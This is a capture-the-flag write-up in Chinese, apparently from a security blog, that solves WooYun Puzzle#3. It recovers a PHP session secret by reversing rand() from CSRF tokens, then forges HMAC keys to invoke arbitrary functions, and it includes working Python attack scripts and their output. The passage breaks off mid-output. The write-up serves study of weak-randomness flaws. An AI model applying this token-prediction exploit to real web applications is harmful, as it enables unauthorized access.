<!DOCTYPE html>
<html lang="en">
<head>
    <title>不插电 · WooYun Puzzle#3 Write up</title>

    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="keywords" content="blog, accent, Larryxi, Larryxi's blog, jekyll">
    <meta name="author" content="Larryxi">
    
    
        
    
    
        
    
    <meta name="description" content="Larryxi's blog,learn security everyday.
">
    <link href='/css/font.css' rel='stylesheet' type='text/css'>
    <link rel="alternate" type="application/rss+xml" title="Larryxi's blog RSS" href="/feed.xml" />
    <link rel="stylesheet" href="/css/main.css">
    
        <link rel="icon" type="image/ico" href="https://larryxi.github.io/images/favicon.ico">
        <link rel="shortcut-icon" type="image/ico" href="https://larryxi.github.io/images/favicon.ico">
    
    
    <!-- Facebook Open Graph -->
    <meta name="og:description" content="Larryxi's blog,learn security everyday.
">
    <meta name="og:title" content="Larryxi's blog">
    <meta name="og:url" content="https://larryxi.github.io/wooyun-pluzze-3-write-up.html">
    <meta name="og:type" content="article">
    
    
    <!-- Twitter -->
    <meta name="twitter:card" content="summary">
    <meta name="twitter:title" content="Larryxi's blog">
    <meta name="twitter:description" content="Larryxi's blog,learn security everyday.
">
    <meta name="twitter:url" content="https://larryxi.github.io/wooyun-pluzze-3-write-up.html">
    
        <meta name="twitter:image" content="images/lubang.jpg">
    
</head>
<body>
    <div class="wrapper">
        <div class="main">
            <nav class="navbar">
                <a href="/">
                    <span class="alignable pull-left back-outer">
                        <span class="alignable pull-left back-inner">
                        </span>
                    </span>
                </a>
            </nav>
            <div class="content container">
    <div class="post-date">
        <time>June 28, 2016 </time>
    </div>
    <h1 class="post-title">不插电 · WooYun Puzzle#3 Write up</h1>
    <h1 id="x00-">0x00 前言</h1>

<hr />

<p>先献上flag，以表正义（我有一颗世界和平的心）</p>

<blockquote>
  <p>Congratulate you, flag is cb6afe419450c23f462159afb9976130</p>
</blockquote>

<p>很高兴能够参加这次WooYun Puzzle，从P师傅出的题目中学到些许东西，下面分三步来突破<a href="http://0dac0a717c3cf340e.jie.sangebaimao.com:82/">安全盒子的秘密</a></p>

<h1 id="x01-">0x01 引诱</h1>

<hr />

<p>题目伊始上来一个“安全盒子”，不清楚具体是什么鬼，先随便提交试试</p>

<p><img src="/images/20160628/1.png" alt="" /></p>

<p>提交后报错说权限拒绝，向这种摸不着头脑的猜测会有源码来告诉你具体逻辑，F12后发现访问源码方法<code>&lt;!-- ?x_show_source --&gt;</code>：</p>

<p><img src="/images/20160628/2.png" alt="" /></p>

<p>随机访问<code>http://0dac0a717c3cf340e.jie.sangebaimao.com:82/?x_show_source</code>后得到源码为：</p>

<div class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
<span class="sd">/**</span>
<span class="sd"> * Created by PhpStorm.</span>
<span class="sd"> * User: phithon</span>
<span class="sd"> * Date: 16/6/8</span>
<span class="sd"> * Time: 上午12:24</span>
<span class="sd"> */</span> 

<span class="c1">//控制报错显示源码</span>
<span class="nb">error_reporting</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
<span class="nb">ini_set</span><span class="p">(</span><span class="s2">&quot;display_errors&quot;</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
<span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;x_show_source&#39;</span><span class="p">]))</span> <span class="p">{</span>
    <span class="nb">show_source</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">);</span>
    <span class="k">exit</span><span class="p">;</span>
<span class="p">}</span>   

<span class="c1">//为每次会话开启session</span>
<span class="nb">session_start</span><span class="p">();</span>

<span class="c1">//根据rand_str()生成6位SECRET_KEY和16位CSRF_TOKEN</span>
<span class="k">if</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;SECRET_KEY&#39;</span><span class="p">]))</span> <span class="p">{</span>
    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;SECRET_KEY&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nx">rand_str</span><span class="p">(</span><span class="mi">6</span><span class="p">);</span>
<span class="p">}</span>
<span class="k">if</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;CSRF_TOKEN&#39;</span><span class="p">]))</span> <span class="p">{</span>
    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;CSRF_TOKEN&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nx">rand_str</span><span class="p">(</span><span class="mi">16</span><span class="p">);</span>
<span class="p">}</span>   

<span class="c1">//包含点，其中可能存在flag</span>
<span class="k">include_once</span> <span class="s2">&quot;flag.php&quot;</span><span class="p">;</span>    

<span class="c1">//使用rand()函数随机生成指定长度字符串</span>
<span class="k">function</span> <span class="nf">rand_str</span><span class="p">(</span><span class="nv">$length</span> <span class="o">=</span> <span class="mi">16</span><span class="p">)</span>
<span class="p">{</span>
    <span class="nv">$rand</span> <span class="o">=</span> <span class="p">[];</span>
    <span class="nv">$_str</span> <span class="o">=</span> <span class="s2">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span><span class="p">;</span>
    <span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$length</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$n</span> <span class="o">=</span> <span class="nb">rand</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$_str</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
        <span class="nv">$rand</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$_str</span><span class="p">{</span><span class="nv">$n</span><span class="p">};</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="nb">implode</span><span class="p">(</span><span class="nv">$rand</span><span class="p">);</span>
<span class="p">}</span>   

<span class="c1">//对ajax的请求以json形式相应，否则直接转换成字符串输出</span>
<span class="k">function</span> <span class="nf">output</span><span class="p">(</span><span class="nv">$obj</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_X_REQUESTED_WITH&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span>
        <span class="nb">strcasecmp</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_X_REQUESTED_WITH&#39;</span><span class="p">],</span> <span class="s1">&#39;XMLHttpRequest&#39;</span><span class="p">)</span> <span class="o">===</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Content-Type: application/json&quot;</span><span class="p">);</span>
        <span class="k">echo</span> <span class="nb">json_encode</span><span class="p">(</span><span class="nv">$obj</span><span class="p">);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Content-Type: text/html; charset=UTF-8&quot;</span><span class="p">);</span>
        <span class="k">echo</span> <span class="nb">strval</span><span class="p">(</span><span class="nv">$obj</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>   

<span class="c1">//每次提交check之后，将CSRF_TOKEN置为null</span>
<span class="k">function</span> <span class="nf">check_csrf_token</span><span class="p">()</span>
<span class="p">{</span>
    <span class="k">if</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;CSRF_TOKEN&#39;</span><span class="p">])</span> <span class="o">||</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;CSRF_TOKEN&#39;</span><span class="p">]</span> <span class="o">!==</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;CSRF_TOKEN&#39;</span><span class="p">])</span> <span class="p">{</span>
        <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;CSRF_TOKEN&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
        <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>   

<span class="c1">//显示form页面</span>
<span class="k">function</span> <span class="nf">show_form_page</span><span class="p">()</span>
<span class="p">{</span>
    <span class="cp">?&gt;</span><span class="x"></span>
<span class="x">    &lt;!DOCTYPE html&gt;</span>
<span class="x">    &lt;html lang=&quot;en&quot;&gt;</span>
<span class="x">    &lt;head&gt;</span>
<span class="x">        &lt;meta charset=&quot;UTF-8&quot;&gt;</span>
<span class="x">        &lt;title&gt;safebox&lt;/title&gt;</span>
<span class="x">        &lt;link rel=&quot;stylesheet&quot; href=&quot;style.css&quot;&gt;</span>
<span class="x">    &lt;/head&gt;</span>
<span class="x">    &lt;body&gt;  </span>

<span class="x">    &lt;div class=&quot;container&quot;&gt;</span>
<span class="x">        &lt;form method=&quot;post&quot;&gt;</span>
<span class="x">        &lt;div class=&quot;block title&quot;&gt;</span>
<span class="x">            安全箱子</span>
<span class="x">        &lt;/div&gt;</span>
<span class="x">        &lt;div class=&quot;block show&quot;&gt;</span>
<span class="x">            &lt;div class=&quot;line&quot;&gt;</span>
<span class="x">                &lt;label&gt;输入验证字符串: &lt;/label&gt;</span>
<span class="x">                &lt;input type=&quot;text&quot; name=&quot;key&quot;&gt;</span>
<span class="x">            &lt;/div&gt;</span>
<span class="x">            &lt;div class=&quot;line&quot;&gt;</span>
<span class="x">                &lt;label&gt;输入方法　　　: &lt;/label&gt;</span>
<span class="x">                &lt;input type=&quot;text&quot; name=&quot;act&quot;&gt;</span>
<span class="x">            &lt;/div&gt;</span>
<span class="x">        &lt;/div&gt;</span>
<span class="x">        &lt;div class=&quot;block info&quot;&gt;</span>
<span class="x">            &lt;input type=&quot;reset&quot; value=&quot;重置&quot;&gt;</span>
<span class="x">            &lt;input name=&quot;submit&quot; type=&quot;submit&quot; value=&quot;提交&quot;&gt;</span>
<span class="x">            &lt;input type=&quot;hidden&quot; name=&quot;CSRF_TOKEN&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;CSRF_TOKEN&#39;</span><span class="p">]</span> <span class="cp">?&gt;</span><span class="x">&quot;&gt;</span>
<span class="x">        &lt;/div&gt;</span>
<span class="x">        &lt;/form&gt;</span>
<span class="x">    &lt;/div&gt;  </span>

<span class="x">    &lt;/body&gt;</span>
<span class="x">    &lt;/html&gt;</span>
<span class="x">    </span><span class="cp">&lt;?php</span>
<span class="p">}</span>   

<span class="c1">//显示报错页面</span>
<span class="k">function</span> <span class="nf">show_error_page</span><span class="p">(</span><span class="nv">$msg</span><span class="p">)</span>
<span class="p">{</span>
    <span class="cp">?&gt;</span><span class="x"></span>
<span class="x">    &lt;!DOCTYPE html&gt;</span>
<span class="x">    &lt;html lang=&quot;en&quot;&gt;</span>
<span class="x">    &lt;head&gt;</span>
<span class="x">        &lt;meta charset=&quot;UTF-8&quot;&gt;</span>
<span class="x">        &lt;title&gt;Error&lt;/title&gt;</span>
<span class="x">        &lt;link rel=&quot;stylesheet&quot; href=&quot;style.css&quot;&gt;</span>
<span class="x">        &lt;!-- ?x_show_source --&gt;</span>
<span class="x">    &lt;/head&gt;</span>
<span class="x">    &lt;body&gt;  </span>

<span class="x">    &lt;div class=&quot;container&quot;&gt;</span>
<span class="x">        &lt;div class=&quot;block title&quot;&gt;</span>
<span class="x">            Error</span>
<span class="x">        &lt;/div&gt;</span>
<span class="x">        &lt;div class=&quot;block show&quot;&gt;</span>
<span class="x">            </span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$msg</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x"></span>
<span class="x">        &lt;/div&gt;</span>
<span class="x">        &lt;div class=&quot;block info&quot;&gt;</span>
<span class="x">            &lt;a href=&quot;javascript:history.back(-1)&quot;&gt;返回&lt;/a&gt;</span>
<span class="x">        &lt;/div&gt;</span>
<span class="x">    &lt;/div&gt;  </span>

<span class="x">    &lt;/body&gt;</span>
<span class="x">    &lt;/html&gt;</span>
<span class="x">    </span><span class="cp">&lt;?php</span>
    <span class="k">exit</span><span class="p">;</span>
<span class="p">}</span>   

<span class="nv">$act</span> <span class="o">=</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;act&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;act&#39;</span><span class="p">]</span> <span class="o">:</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
<span class="nv">$key</span> <span class="o">=</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;key&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;key&#39;</span><span class="p">]</span> <span class="o">:</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
<span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;submit&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">check_csrf_token</span><span class="p">())</span> <span class="p">{</span>                 <span class="c1">//csrf_token校验</span>
    <span class="k">if</span><span class="p">(</span><span class="nb">hash_hmac</span><span class="p">(</span><span class="s1">&#39;md5&#39;</span><span class="p">,</span> <span class="nv">$act</span><span class="p">,</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;SECRET_KEY&#39;</span><span class="p">])</span> <span class="o">===</span> <span class="nv">$key</span><span class="p">)</span> <span class="p">{</span>  <span class="c1">//hmac_md5校验</span>
        <span class="k">if</span><span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="nv">$act</span><span class="p">))</span> <span class="p">{</span>                                 <span class="c1">//函数存在性校验</span>
            <span class="nv">$exec_res</span> <span class="o">=</span> <span class="nv">$act</span><span class="p">();</span>                                     <span class="c1">//调用指定函数</span>
            <span class="nx">output</span><span class="p">(</span><span class="nv">$exec_res</span><span class="p">);</span>                                      <span class="c1">//输出函数返回结果</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="nx">show_error_page</span><span class="p">(</span><span class="s2">&quot;Function not found!!&quot;</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="nx">show_error_page</span><span class="p">(</span><span class="s2">&quot;Permission deny!!&quot;</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="nx">show_form_page</span><span class="p">();</span>
<span class="p">}</span></code></pre></div>

<p>所以重点在与最后的指定函数调用，分析如下：</p>

<ol>
  <li>csrf_token校验：这里保证了提交的crsf_token的正确性，但小白我没有看出存在csrf的场景，token略显可疑</li>
  <li>hmac_md5校验：对于<a href="http://www.cnblogs.com/soundcode/p/3802344.html">HMAC-MD5</a>，自认为算法上不存在什么缺陷，又是<code>===</code>进行判断，就使得我们必须知道<code>$_SESSION['SECRET_KEY']</code>的确切值，才能进入之后的if逻辑</li>
  <li>函数存在性校验：先检验载调用函数，而这里具有利用价值的估计就是包含在flag.php中的函数了</li>
  <li>调用指定函数：无参数传递，感觉会是个小坑哈</li>
  <li>输出函数返回结果：两种输出方式二选其一，猜测作者这里也另有目的</li>
</ol>

<p>在程序中，对于每一个session都会先生成6位SECRET_KEY保持不变，在每次提交后对16位的CSRF_TOKEN进行变化。要知道SECRET_KEY的确切值，我首先想到的是暴力破解，虽然62**6不是太大，可是后续的套具体还不知道，而且出题人也不会这么无聊，尝试了一下就放弃了这个想法。既然不能猜那就预测呗，我的痛苦经历让我想到了一次CTF的rand()预测题目，具体原理与题目可见：</p>

<ul>
  <li><a href="http://www.freebuf.com/articles/web/99093.html">http://www.freebuf.com/articles/web/99093.html</a></li>
  <li><a href="http://www.mscs.dal.ca/~selinger/random/">http://www.mscs.dal.ca/~selinger/random/</a></li>
</ul>

<p>有没感觉很像，CTF题目中是多次输出rand()的值，再结合其生成算法，根据其之前生成的值预测之后的值：</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">O_31</span> <span class="o">=</span> O_0 + O_28 mod 2**31
<span class="nv">O_32</span> <span class="o">=</span> O_1 + O_29 mod 2**31
<span class="nv">O_33</span> <span class="o">=</span> O_2 + O_30 mod 2**31
<span class="nv">O_34</span> <span class="o">=</span> O_3 + O_31 mod 2**31 
<span class="nv">O_35</span> <span class="o">=</span> O_4 + O_32 mod 2**31
<span class="nv">O_36</span> <span class="o">=</span> O_5 + O_33 mod 2**31</code></pre></div>

<p>而我们这里呢，是每次提交后CSRF_TOKEN都会变化，而token中的字符根据对应关系也就是由rand()生成的值。但他们是向后预测，我们好像是向前推理，那该怎么办呢？加法会减法就不会啦?！</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">O_0</span> <span class="o">=</span> O_31 - O_28 mod 2**31
...
<span class="nv">O_5</span> <span class="o">=</span> O_36 - O_33 mod 2**31</code></pre></div>

<p>可是我们这里的rand()是有范围的那该如何呢，<a href="https://www.google.com/webhp?sourceid=chrome-instant&amp;ion=1&amp;espv=2&amp;ie=UTF-8#q=php%20rand%20source%20code">搜一搜</a>翻出对应的<a href="https://github.com/php/php-src/blob/PHP-5.6.21/ext/standard/rand.c">源码</a>即可找到答案：</p>

<p><img src="/images/20160628/3.png" alt="" /></p>

<p><img src="/images/20160628/4.png" alt="" /></p>

<p>对于<code>n' = a + n(b-a+1)/(M+1)</code>，我们先令a=0,b=61化简成<code>n' = 62n/(M+1)</code>,把运算用于整个公式，我再偷一下懒最后使用<code>(o[31+i]+62-o[28+i])%62</code>来推算前6位的SECRET_KEY，初步代码（new-1.py）如下：</p>

<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">re</span>
<span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">hmac</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="nb">reload</span><span class="p">(</span><span class="n">sys</span><span class="p">)</span>
<span class="n">sys</span><span class="o">.</span><span class="n">setdefaultencoding</span><span class="p">(</span><span class="s">&#39;utf-8&#39;</span><span class="p">)</span> 

<span class="n">url</span> <span class="o">=</span> <span class="s">&quot;http://0dac0a717c3cf340e.jie.sangebaimao.com:82/&quot;</span>
<span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">session</span><span class="p">()</span>
<span class="n">str_list</span> <span class="o">=</span> <span class="s">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>
<span class="n">re_csrf_token</span> <span class="o">=</span> <span class="s">r&#39;(?&lt;=value=&quot;).*?(?=&quot;)&#39;</span>
<span class="n">action</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>    

<span class="k">def</span> <span class="nf">parse</span><span class="p">(</span><span class="n">token</span><span class="p">,</span><span class="n">s</span><span class="p">):</span>
    <span class="n">d</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">token</span><span class="p">)):</span>
        <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">s</span><span class="p">)):</span>
            <span class="k">if</span> <span class="n">token</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="n">s</span><span class="p">[</span><span class="n">j</span><span class="p">]:</span>
                <span class="n">d</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">j</span><span class="p">)</span>
                <span class="k">break</span>
    <span class="k">return</span> <span class="n">d</span>    

<span class="k">def</span> <span class="nf">guess</span><span class="p">(</span><span class="n">d</span><span class="p">,</span><span class="n">s</span><span class="p">,</span><span class="n">a</span><span class="p">):</span>
    <span class="n">result</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">6</span><span class="p">):</span>
        <span class="n">r</span> <span class="o">=</span> <span class="p">(</span><span class="n">d</span><span class="p">[</span><span class="mi">31</span><span class="o">+</span><span class="n">i</span><span class="p">]</span><span class="o">+</span><span class="mi">62</span><span class="o">-</span><span class="n">d</span><span class="p">[</span><span class="mi">28</span><span class="o">+</span><span class="n">i</span><span class="p">])</span><span class="o">%</span><span class="mi">62</span>
        <span class="n">result</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
    <span class="n">key</span> <span class="o">=</span> <span class="s">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">s</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="n">result</span><span class="p">)</span> 

    <span class="k">return</span> <span class="n">hmac</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">,</span><span class="n">a</span><span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>  

<span class="n">r0</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
<span class="n">token0</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="n">re_csrf_token</span><span class="p">,</span><span class="n">r0</span><span class="o">.</span><span class="n">text</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
<span class="n">d0</span> <span class="o">=</span> <span class="n">parse</span><span class="p">(</span><span class="n">token0</span><span class="p">,</span><span class="n">str_list</span><span class="p">)</span>
<span class="n">payload0</span> <span class="o">=</span> <span class="p">{</span><span class="s">&#39;submit&#39;</span><span class="p">:</span><span class="s">&#39;go&#39;</span><span class="p">,</span> <span class="s">&#39;CSRF_TOKEN&#39;</span><span class="p">:</span><span class="n">token0</span><span class="p">,</span> <span class="s">&#39;act&#39;</span><span class="p">:</span><span class="n">action</span><span class="p">,</span> <span class="s">&#39;key&#39;</span><span class="p">:</span><span class="s">&#39;1234567&#39;</span><span class="p">}</span>
<span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">payload0</span><span class="p">)</span>
<span class="n">r1</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
<span class="n">token1</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="n">re_csrf_token</span><span class="p">,</span><span class="n">r1</span><span class="o">.</span><span class="n">text</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
<span class="n">d1</span> <span class="o">=</span> <span class="n">parse</span><span class="p">(</span><span class="n">token1</span><span class="p">,</span><span class="n">str_list</span><span class="p">)</span>
<span class="n">pre</span> <span class="o">=</span>  <span class="p">[</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">]</span><span class="o">+</span><span class="n">d0</span><span class="o">+</span><span class="n">d1</span>
<span class="n">key</span> <span class="o">=</span> <span class="n">guess</span><span class="p">(</span><span class="n">pre</span><span class="p">,</span><span class="n">str_list</span><span class="p">,</span><span class="n">action</span><span class="p">)</span>
<span class="n">payload1</span> <span class="o">=</span> <span class="p">{</span><span class="s">&#39;submit&#39;</span><span class="p">:</span><span class="s">&#39;go&#39;</span><span class="p">,</span> <span class="s">&#39;CSRF_TOKEN&#39;</span><span class="p">:</span><span class="n">token1</span><span class="p">,</span> <span class="s">&#39;act&#39;</span><span class="p">:</span><span class="n">action</span><span class="p">,</span> <span class="s">&#39;key&#39;</span><span class="p">:</span><span class="n">key</span><span class="p">}</span>
<span class="n">r2</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">payload1</span><span class="p">)</span>    

<span class="k">if</span> <span class="s">&#39;Permission deny!!&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">r2</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
    <span class="k">print</span> <span class="s">&#39;[+]Done!&#39;</span>
    <span class="k">print</span> <span class="n">r2</span><span class="o">.</span><span class="n">text</span></code></pre></div>

<p>由于rand生成算法中有加1的随机情况存在，所以这里就需要多推测几次得到正确的SECRET_KEY，进入if逻辑调用函数，所以再写一个初步的代码（get-1.py）重复测试</p>

<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="c">#!/usr/bin/env python</span>
<span class="c">#coding=utf-8   </span>

<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">subprocess</span>   

<span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
    <span class="n">output</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">check_output</span><span class="p">([</span><span class="s">&#39;python&#39;</span><span class="p">,</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]])</span>
    <span class="k">if</span> <span class="n">output</span><span class="p">:</span>
        <span class="k">print</span> <span class="n">output</span>
        <span class="k">break</span></code></pre></div>

<p>运行得到如下输出：</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>python get-1.py new-1.py flag
<span class="o">[</span>+<span class="o">]</span>Done!
    &lt;!DOCTYPE html&gt;
    &lt;html <span class="nv">lang</span><span class="o">=</span><span class="s2">&quot;en&quot;</span>&gt;
    &lt;head&gt;
        &lt;meta <span class="nv">charset</span><span class="o">=</span><span class="s2">&quot;UTF-8&quot;</span>&gt;
        &lt;title&gt;Error&lt;/title&gt;
        &lt;link <span class="nv">rel</span><span class="o">=</span><span class="s2">&quot;stylesheet&quot;</span> <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;style.css&quot;</span>&gt;
        &lt;!-- ?x_show_source --&gt;
    &lt;/head&gt;
    &lt;body&gt;  

    &lt;div <span class="nv">class</span><span class="o">=</span><span class="s2">&quot;container&quot;</span>&gt;
        &lt;div <span class="nv">class</span><span class="o">=</span><span class="s2">&quot;block title&quot;</span>&gt;
            Error
        &lt;/div&gt;
        &lt;div <span class="nv">class</span><span class="o">=</span><span class="s2">&quot;block show&quot;</span>&gt;
            Function not found!!        &lt;/div&gt;
        &lt;div <span class="nv">class</span><span class="o">=</span><span class="s2">&quot;block info&quot;</span>&gt;
            &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;javascript:history.back(-1)&quot;</span>&gt;返回&lt;/a&gt;
        &lt;/div&gt;
    &lt;/div&gt;  

    &lt;/body&gt;
    &lt;/html&gt;</code></pre></div>

<p>显然我这样瞎猜函数不会是个头，那就必须知道flag.php中是否有函数可供我们利用呢，所以我们就得知道哪些函数可以查看当前脚本中定义的函数，变量，常量等信息，百度一下你就知道：<a href="http://www.jb51.net/article/42890.htm">PHP输出当前进程所有变量/常量/模块/函数/类的示例</a>，正好还都是不需要参数的。我首先利用get_defined_vars()和get_defined_constants()看看能不能直接脱出flag变量或者常量，然而并没有我想象的那么简单。那就用get_defined_functions看看吧：</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>python get-1.py new-1.py get_defined_functions
<span class="o">[</span>+<span class="o">]</span>Done!
&lt;br /&gt;
&lt;b&gt;Notice&lt;/b&gt;:  Array to string conversion in &lt;b&gt;/app/index.php&lt;/b&gt; on line &lt;b&gt;45&lt;/b&gt;&lt;br /&gt;
Array</code></pre></div>

<p>这里函数的结果是个数组，而strval()对数组的变换同一是”Array”。那就试试让其用json响应呗，根据<a href="http://stackoverflow.com/questions/28610376/sending-an-jquery-ajax-get-request-with-python-request-library">stackoverflow</a>上大神的回答，我们加个<code>'X-Requested-With': 'XMLHttpRequest'</code>的header就好了，输出如下（有省略）：</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>python get-1.py new-1.py get_defined_functions
<span class="o">[</span>+<span class="o">]</span>Done!
